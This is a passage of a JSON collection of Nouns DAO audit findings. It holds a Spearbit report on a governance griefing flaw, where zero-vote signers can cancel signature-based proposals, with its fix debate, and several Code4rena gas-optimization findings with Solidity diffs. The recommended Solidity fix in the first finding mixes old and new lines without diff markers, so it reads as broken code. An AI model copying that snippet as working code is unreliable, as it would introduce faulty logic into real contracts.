proposals.\n\n- **High likelihood + Medium impact = High severity.**\n  - **Likelihood** is High because anyone with no special ownership (of Nouns) or special roles in the protocol could initiate a signature to be accepted by the proposer. \n  - We assume no other checks by e.g., frontend because those are out-of-scope, not specified/documented, depend on the implementation, depend on their trust/threat models, or may be bypassed with protocol actors interacting directly with the contracts. We cannot be sure of how the proposer decides on which signatures to include and what checks are actually made, as that is done offchain. \n  - Without that information, we are assuming that the proposer includes all signatures they receive.\n  \n  - **Impact** is Medium because, with the likelihood rationale, anyone can get their signature included to later cancel a signature-backed proposal, which, in the worst case (again without additional checks/logic), gives anyone a veto power on all signature-based proposals potentially bringing governance to a standstill if signatures are expected to be the dominant approach forward. \n\nEven if we assume that a proposer learns to exclude a zero-vote cancelling signer (with external checks) after experiencing this griefing, the signer can move on to other unsuspecting proposers. Given that this is one of the key features of V3 UX, we reason that this permissionless griefing DoS on governance to be of Medium impact.\n\nWhile the cancellation capability is indeed specified as the intended design, we reason that this is a risky feature for the reasons explained above. This should ideally be determined based only on the contributing voting power, as suggested in our recommendation. Filtering out signers with zero voting power raises the bar from the current situation in requiring signers to have non-zero voting power (i.e., the cost of the griefing attack becomes non-zero) but will not prevent signers from transferring their voting power (granting Noun(s) to other addresses), getting new valid signatures included on other signature-based proposals, and griefing them later by cancelling. Equating non-zero voting power to veto power on all signature-based proposals in the protocol continues to be very risky.\n\n### Recommendation\nConsider the following mitigative redesign (as a suggestive example, i.e., there could be others) to allow cancellations only based on cumulative voting power:\n1. Remove special consideration for the proposer in the signature-based flow in `verifySignersCanBackThisProposalAndCountTheirVotes()` and other related logic to instead make them include their signature along with other signers.\n2. Remove the logic of `msgSenderIsProposer` in `cancel()` to allow cancellations only if the cumulative votes of signers is less than `proposal.proposalThreshold`.\n3. Add `cancelledSigs` like logic in cumulative voting power calculation of `cancel()` to have signers rely on it to remove their support even beyond the proposal creation state.\n4. Allow anyone to permissionlessly (i.e., doesn't have to be proposer or signer) call `cancel()` which calculates the cumulative voting power calculation of the proposal while accounting for `cancelledSigs` like logic from all signers (even the proposer who is also a signatory like other signers) and cancels the proposal transactions if the cumulative voting power is below `proposalThreshold`.\n\nThe scale of the modifications proposed isn't too substantial; the base recommendation can be outlined as:\n```solidity\n// NounsDAOV3Proposals.sol#L560-L587\nfunction cancel(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n    ...\n    NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n    address proposer = proposal.proposer;\n    NounsTokenLike nouns = ds.nouns;\n    uint256 votes = nouns.getPriorVotes(proposer, block.number - 1);\n    bool msgSenderIsProposer = proposer == msg.sender;\n    address[] memory signers = proposal.signers;\n    for (uint256 i = 0; i < signers.length; ++i) {\n        msgSenderIsProposer = msgSenderIsProposer || msg.sender == signers[i];\n        votes += nouns.getPriorVotes(signers[i], block.number - 1);\n        if (!ds.cancelledSigProposals[signers[i]][proposalId]) {\n            votes += nouns.getPriorVotes(signers[i], block.number - 1);\n        }\n    }\n    require(\n        proposer == msg.sender || votes <= proposal.proposalThreshold,\n        'NounsDAO::cancel: proposer above threshold '\n    );\n}\n\n// NounsDAOInterfaces.sol#L684-L685\n/// @notice user => sig => isCancelled: signatures that have been cancelled by the signer and are no longer valid\nmapping(address => mapping(bytes32 => bool)) cancelledSigs;\n\n/// @notice user => proposalId => isCancelled: proposals for which signers has cancelled their signatures\nmapping(address => mapping(uint256 => bool)) cancelledSigProposals;\n\n// NounsDAOV3Proposals.sol#L262-L267\nfunction cancelSig(NounsDAOStorageV3.StorageV3 storage ds, bytes calldata sig) external {\n    function cancelSig(NounsDAOStorageV3.StorageV3 storage ds, bytes calldata sig, uint256 proposalId) external {\n        bytes32 sigHash = keccak256(sig);\n        ds.cancelledSigs[msg.sender][sigHash] = true;\n        if (proposalId > 0) {\n            ds.cancelledSigProposals[msg.sender][proposalId] = true;\n        }\n        emit SignatureCancelled(msg.sender, sig);\n    }\n}\n```\n\n### Nouns\nSigners being able to cancel a proposer they signed is a conscious design choice. We plan to filter out signers that have voting power of zero in `proposeBySigs`. We implemented a fix here: PR 713 but still think the severity should be lowered.\n\n- **Likelihood:** Low. Only the proposer of a proposal can call `proposerBySigs`, therefore, a malicious signer can't include the signature by front-running, for example. Additionally, the frontend will filter out signers that have no voting power as well as notify the user that any signer included will have the power to cancel the proposal. Therefore, we think the likelihood that a user would add a signer with no voting power is low.\n  \n- **Impact:** Low. Even if for some reason, perhaps confusion, a user adds a signer with zero votes and their proposal gets cancelled, they can propose again and are unlikely to make the same mistake again.\n\nFor the reasons we shared earlier: **won’t fix.**\n\n### Spearbit\nThe proposed fix PR 713 checks for signer votes and skips inclusion/consideration if the votes are zero. It also reverts if the number of non-zero signers is zero.\n\nThe fix for the described surface and our recommendation would be to remove the ability of a signer to cancel unconditionally. Simultaneously, to keep the relevant degree of renouncing power in the hands of signers, `cancelledSigs` like mechanics can be added to the `cancel()` logic.\n\nCurrently, `cancelSig()` has no implications on `cancel()`, which doesn't look like consistent behavior, as whenever a signer runs `cancelSig()` they could not expect that it's not enough and there is also `cancel()` that needs to be run, otherwise the signature remains de facto fully valid.\n\nAt the same time, the ability of any signer to cancel unconditionally appears to be excessive. Why is the cancellation justified when there are enough votes to pass the proposal threshold even without this signature? We see a griefing surface here with not much value added.\n\nTherefore, we are not convinced that the proposed fix mitigates the described risk completely.",
      "summary": "\nThis bug report is about a vulnerability in the NounsDAOV3Proposals.sol contract that allows any proposal signer, besides the proposer, to cancel the proposal even if they contributed zero votes towards the threshold. This means that anyone can sign off on any valid proposal and then cancel it, effectively giving them a veto power on all signature-based proposals. The impact of this vulnerability is medium because it can be used to bring governance to a standstill if signatures are expected to be the dominant approach.\n\nThe recommendation is to remove the special consideration for the proposer in the signature-based flow and to remove the logic of msgSenderIsProposer in cancel(). Additionally, cancelledSigs like logic should be added to the cumulative voting power calculation of cancel() and allow anyone to permissionlessly call cancel(). This will ensure that only signers with a non-zero voting power can cancel a proposal. \n\nThe proposed fix PR 713 checks for signer votes and skips inclusion/consideration if its votes is zero. However, the bug report authors are not convinced that this mitigates the risk completely.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "20212",
      "title": "[G-12] Importing an entire library while only using one function isn't necessary",
      "impact": "GAS",
      "content": "https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol#L22\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol\n22:import { SafeCast } from '@openzeppelin/contracts/utils/math/SafeCast.sol';\n\n252:            proposal.objectionPeriodEndBlock = SafeCast.toUint64(\n253:                proposal.endBlock + ds.objectionPeriodDurationInBlocks\n254:            );\n```\n\nWe import the entire library `SafeCast` yet we only need to utilize one function from it ie `toUint64()`. Peeking into it's implementation from Openzeppelin we have the following\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/7ccea54dc15856d0e6c3b61b829b85d9e52195cd/contracts/utils/math/SafeCast.sol#L441-L446.\n\n```solidity\nFile: /contracts/utils/math/SafeCast.sol\n441:    function toUint64(uint256 value) internal pure returns (uint64) {\n442:        if (value > type(uint64).max) {\n443:            revert SafeCastOverflowedUintDowncast(64, value);\n444:        }\n445:        return uint64(value);\n446:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol\nindex 3743132b..782a2cf2 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol\n@@ -19,13 +19,14 @@ pragma solidity ^0.8.19;\n\n import './NounsDAOInterfaces.sol';\n import { NounsDAOV3Proposals } from './NounsDAOV3Proposals.sol';\n-import { SafeCast } from '@openzeppelin/contracts/utils/math/SafeCast.sol';\n\n library NounsDAOV3Votes {\n     using NounsDAOV3Proposals for NounsDAOStorageV3.StorageV3;\n\n     error CanOnlyVoteAgainstDuringObjectionPeriod();\n\n+    error SafeCastOverflowedUintDowncast();\n+\n     /// @notice An event emitted when a vote has been cast on a proposal\n     /// @param voter The address which casted a vote\n     /// @param proposalId The proposal id which was voted on\n@@ -249,9 +250,11 @@ library NounsDAOV3Votes {\n             // second part of the vote flip check\n             !ds.isDefeated(proposal)\n         ) {\n-            proposal.objectionPeriodEndBlock = SafeCast.toUint64(\n-                proposal.endBlock + ds.objectionPeriodDurationInBlocks\n-            );\n+\n+            if (proposal.endBlock + ds.objectionPeriodDurationInBlocks  > type(uint64).max) {\n+                        revert SafeCastOverflowedUintDowncast();\n+            }\n+            proposal.objectionPeriodEndBlock = uint64(proposal.endBlock + ds.objectionPeriodDurationInBlocks);\n\n             emit ProposalObjectionPeriodSet(proposal.id, proposal.objectionPeriodEndBlock);\n         }\n```\n\nAlternatively we can implement our own internal function to do the safeCast.\n\n## Conclusion\nIt is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.\n\nAs you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.\n\nShould you have any questions or need further assistance, please don't hesitate to reach out.\n\n\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20211",
      "title": "[G-11] Caching a variable that is used once just wastes Gas",
      "impact": "GAS",
      "content": "\n### No need to cache `ds.forkEscrow` as it's being used once\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol#L141-L160\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol\n141:    function joinFork(\n142:        NounsDAOStorageV3.StorageV3 storage ds,\n143:        uint256[] calldata tokenIds,\n144:        uint256[] calldata proposalIds,\n145:        string calldata reason\n146:    ) external {\n147:        if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive();\n\n149:        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;\n150:        address timelock = address(ds.timelock);\n151:        sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds));\n\n153:        for (uint256 i = 0; i < tokenIds.length; i++) {\n154:            ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]);\n155:        }\n\n157:        NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds);\n\n159:        emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);\n160:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol b/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol\nindex d87ffc70..4051da05 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol\n@@ -146,7 +146,6 @@ library NounsDAOV3Fork {\n     ) external {\n         if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive();\n\n-        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;\n         address timelock = address(ds.timelock);\n         sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds));\n\n@@ -156,7 +155,7 @@ library NounsDAOV3Fork {\n\n         NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds);\n\n-        emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);\n+        emit JoinFork(ds.forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);\n     }\n```\n\n### NounsTokenFork.sol.claimDuringForkPeriod(): `_currentNounId` should not be cached\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L166-L185\n\nThe variable `currentNounId` is being once, as such no need to cache.\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n166:    function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {\n167:        uint256 currentNounId = _currentNounId;\n\n184:        if (maxNounId >= currentNounId) _currentNounId = maxNounId + 1;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20210",
      "title": "[G-10] Nested if is cheaper than single statement",
      "impact": "GAS",
      "content": "https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L243-L245\n\n```solidity\nFile: /packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol\n243:        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {\n244:            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n245        } else {          }\n```\n\n```diff\n\n-        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {\n-            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n+        if (nCheckpoints > 0) {\n+            if( checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {\n+                 checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n+            }\n         } else {\n```\n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L381-L383\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n381:        if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > 0) {\n382:            revert WaitingForTokensToClaimOrExpiration();\n383:        }\n```\n\n```diff\n-        if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > 0) {\n-            revert WaitingForTokensToClaimOrExpiration();\n+        if (block.timestamp < delayedGovernanceExpirationTimestamp) {\n+            if ( nouns.remainingTokensToClaim() > 0) {\n+                revert WaitingForTokensToClaimOrExpiration();\n+            }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20209",
      "title": "[G-09] The following functions can benefit from some optimizations",
      "impact": "GAS",
      "content": "\n<details>\n\n### We can  optimize the function `_acceptAdmin` (Save 4 SLOADS: ~400 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L854-L870\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n854:    function _acceptAdmin() external {\n855:        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n856:        require(msg.sender == pendingAdmin && msg.sender != address(0), 'NounsDAO::_acceptAdmin: pending admin only');\n\n858:        // Save current values for inclusion in log\n859:        address oldAdmin = admin;\n860:        address oldPendingAdmin = pendingAdmin;\n\n862:        // Store admin with value pendingAdmin\n863:        admin = pendingAdmin;\n\n865:        // Clear the pending value\n866:        pendingAdmin = address(0);\n\n868:        emit NewAdmin(oldAdmin, admin);\n869:        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n870:    }\n```\nThe first thing the function does is validate that `msg.sender== pendingAdmin` which means that to proceed with execution the state variable `pendingAdmin` should be equal to `msg.sender`. As such instead of reading  the state variable `pendingAdmin` on the next operations, we can replace it's occurrence with the cheaper global variable `msg.sender`.\n\nOn line 866, we set `pendingAdmin = address(0)`, we then proceed to emit an event that has the state variable `pendingAdmin`, we can refactor this emit to emit the `address(0)` instead as we already know that's the value of the state variable.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..1cd99181 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -857,16 +857,16 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n\n         // Save current values for inclusion in log\n         address oldAdmin = admin;\n-        address oldPendingAdmin = pendingAdmin;\n+        address oldPendingAdmin = msg.sender;\n\n         // Store admin with value pendingAdmin\n-        admin = pendingAdmin;\n+        admin = msg.sender;\n\n         // Clear the pending value\n         pendingAdmin = address(0);\n\n-        emit NewAdmin(oldAdmin, admin);\n-        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n+        emit NewAdmin(oldAdmin, msg.sender);\n+        emit NewPendingAdmin(oldPendingAdmin, address(0));\n     }\n\n```\n\n### We can optimize the function `_acceptVetoer()` Save 3 SLOADS: ~300 gas\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L886-L898\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n886:    function _acceptVetoer() external {\n887:        if (msg.sender != pendingVetoer) {\n888:            revert PendingVetoerOnly();\n889:        }\n\n891:        // Update vetoer\n892:        emit NewVetoer(vetoer, pendingVetoer);\n893:        vetoer = pendingVetoer;\n\n895:        // Clear the pending value\n896:        emit NewPendingVetoer(pendingVetoer, address(0));\n897:        pendingVetoer = address(0);\n898:    }\n```\n\nThe first check ensures that `msg.sender` is equal to `pendingVetoer` and reverts if not. Thus executing other operations on this function is guaranteed that the `msg.sender` is same as `pendingVetoer`. As `pendingVetoer` is a state variable, we can replace it's occurrence with `msg.sender` which is a global variable thus more cheaper to read.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..7be11cf8 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -889,11 +889,11 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         }\n\n         // Update vetoer\n-        emit NewVetoer(vetoer, pendingVetoer);\n-        vetoer = pendingVetoer;\n+        emit NewVetoer(vetoer, msg.sender);\n+        vetoer = msg.sender;\n\n         // Clear the pending value\n-        emit NewPendingVetoer(pendingVetoer, address(0));\n+        emit NewPendingVetoer(msg.sender, address(0));\n         pendingVetoer = address(0);\n     }\n```\n\n### We can optimize the function `_acceptAdmin()` Save 3 SLOADS: ~300 gas\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L276-L295\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n276:    function _acceptAdmin(NounsDAOStorageV3.StorageV3 storage ds) external {\n277:        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n278:        require(\n279:            msg.sender == ds.pendingAdmin && msg.sender != address(0),\n280:            'NounsDAO::_acceptAdmin: pending admin only'\n281:        );\n\n283:        // Save current values for inclusion in log\n284:        address oldAdmin = ds.admin;\n285:        address oldPendingAdmin = ds.pendingAdmin;\n\n287:        // Store admin with value pendingAdmin\n288:        ds.admin = ds.pendingAdmin;\n\n290:        // Clear the pending value\n291:        ds.pendingAdmin = address(0);\n\n293:        emit NewAdmin(oldAdmin, ds.admin);\n294:        emit NewPendingAdmin(oldPendingAdmin, address(0));\n295:    }\n```\nWe are checking that `msg.sender == ds.pendingAdmin` and reverting if not. Instead of reading `ds.pendingAdmin` which is  a state variable in next operations, we can instead read `msg.sender` which is a global variable hence more cheaper in terms of gas.\n\nWe then set `ds.admin` equal to `ds.pendingAdmin`(which we've established is equal to `msg.sender`). On the emit block, instead of emitting `ds.admin` we might as well just emit `msg.sender`.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\nindex 4dcacae8..452e89b4 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n@@ -282,15 +282,15 @@ library NounsDAOV3Admin {\n\n         // Save current values for inclusion in log\n         address oldAdmin = ds.admin;\n-        address oldPendingAdmin = ds.pendingAdmin;\n+        address oldPendingAdmin = msg.sender;\n\n         // Store admin with value pendingAdmin\n-        ds.admin = ds.pendingAdmin;\n+        ds.admin = msg.sender;\n\n         // Clear the pending value\n         ds.pendingAdmin = address(0);\n\n-        emit NewAdmin(oldAdmin, ds.admin);\n+        emit NewAdmin(oldAdmin, msg.sender);\n         emit NewPendingAdmin(oldPendingAdmin, address(0));\n     }\n```\n\n### `_acceptVetoer()` can be optimized (Save 3 SLOADs: ~300 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L314-L326\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n314:    function _acceptVetoer(NounsDAOStorageV3.StorageV3 storage ds) external {\n315:        if (msg.sender != ds.pendingVetoer) {\n316:            revert PendingVetoerOnly();\n317:        }\n\n319:        // Update vetoer\n320:        emit NewVetoer(ds.vetoer, ds.pendingVetoer);\n321:        ds.vetoer = ds.pendingVetoer;\n\n323:        // Clear the pending value\n324:        emit NewPendingVetoer(ds.pendingVetoer, address(0));\n325:        ds.pendingVetoer = address(0);\n326:    }\n```\n\nThe first check ensures that `msg.sender`  is same as `ds.pendingVetoer` and reverts the call if not. We can therefore save some gas by replacing the `ds.pendingVetoer` variable access with `msg.sender`.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\nindex 4dcacae8..f7fe6acd 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n@@ -317,11 +317,11 @@ library NounsDAOV3Admin {\n         }\n\n         // Update vetoer\n-        emit NewVetoer(ds.vetoer, ds.pendingVetoer);\n-        ds.vetoer = ds.pendingVetoer;\n+        emit NewVetoer(ds.vetoer, msg.sender);\n+        ds.vetoer = msg.sender;\n\n         // Clear the pending value\n-        emit NewPendingVetoer(ds.pendingVetoer, address(0));\n+        emit NewPendingVetoer(msg.sender, address(0));\n         ds.pendingVetoer = address(0);\n     }\n```\n\n### Cheaper to read global variable compared to state variable (Save 1 SLOAD: ~100 gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L332-L337\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n332:    function _burnVetoPower(NounsDAOStorageV3.StorageV3 storage ds) public {\n333:        // Check caller is vetoer\n334:        require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only');\n\n336:        // Update vetoer to 0x0\n337:        emit NewVetoer(ds.vetoer, address(0));\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\nindex 4dcacae8..1f747a58 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n@@ -334,7 +334,7 @@ library NounsDAOV3Admin {\n         require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only');\n\n         // Update vetoer to 0x0\n-        emit NewVetoer(ds.vetoer, address(0));\n+        emit NewVetoer(msg.sender, address(0));\n         ds.vetoer = address(0);\n```\n\n### We can optimize the function `_acceptAdmin()` (Save 4 SLOADs: ~400 Gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L731-L747\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n731:    function _acceptAdmin() external {\n732:        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n733:        require(msg.sender == pendingAdmin && msg.sender != address(0), 'NounsDAO::_acceptAdmin: pending admin only');\n\n735:        // Save current values for inclusion in log\n736:        address oldAdmin = admin;\n737:        address oldPendingAdmin = pendingAdmin;\n\n739:        // Store admin with value pendingAdmin\n740:        admin = pendingAdmin;\n\n742:        // Clear the pending value\n743:        pendingAdmin = address(0);\n\n745:        emit NewAdmin(oldAdmin, admin);\n746:        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n747:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\nindex 0b098e44..7351d0d9 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n@@ -734,16 +734,16 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou\n\n         // Save current values for inclusion in log\n         address oldAdmin = admin;\n-        address oldPendingAdmin = pendingAdmin;\n+        address oldPendingAdmin = msg.sender;\n\n         // Store admin with value pendingAdmin\n-        admin = pendingAdmin;\n+        admin = msg.sender;\n\n         // Clear the pending value\n         pendingAdmin = address(0);\n\n-        emit NewAdmin(oldAdmin, admin);\n-        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n+        emit NewAdmin(oldAdmin, msg.sender);\n+        emit NewPendingAdmin(oldPendingAdmin, address(0));\n     }\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20208",
      "title": "[G-08] Optimizing check order for cost efficient function execution",
      "impact": "GAS",
      "content": "\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.\n\n<details>\n\n### Cheaper require statements should be performed first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L143-L161\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n143:    ) public virtual {\n144:        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n145:        if (msg.sender != admin) {\n146:            revert AdminOnly();\n147:        }\n148:        require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');\n149:        require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');\n150:        require(\n151:            votingPeriod_ >= MIN_VOTING_PERIOD && votingPeriod_ <= MAX_VOTING_PERIOD,\n152:            'NounsDAO::initialize: invalid voting period'\n153:        );\n154:        require(\n155:            votingDelay_ >= MIN_VOTING_DELAY && votingDelay_ <= MAX_VOTING_DELAY,\n156:            'NounsDAO::initialize: invalid voting delay'\n157:        );\n158:        require(\n159:            proposalThresholdBPS_ >= MIN_PROPOSAL_THRESHOLD_BPS && proposalThresholdBPS_ <= MAX_PROPOSAL_THRESHOLD_BPS,\n160:            'NounsDAO::initialize: invalid proposal threshold bps'\n161:        );\n```\nIn the above function, the first sanity checks(require statements) validates some state variables ie Involves reading from state which is quite expensive(2100 Cold ,100 warm). In this case we read `timelock` and `admin` . In case of a revert on other cheaper checks eg function parameter checks, we would end up wasting the gas spent validating the state variables ~4000 gas. To minimize this cost, we can first validate the variables that are cheaper to check. Reorder the checks as follows.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..1f02f8dd 100644\n--- 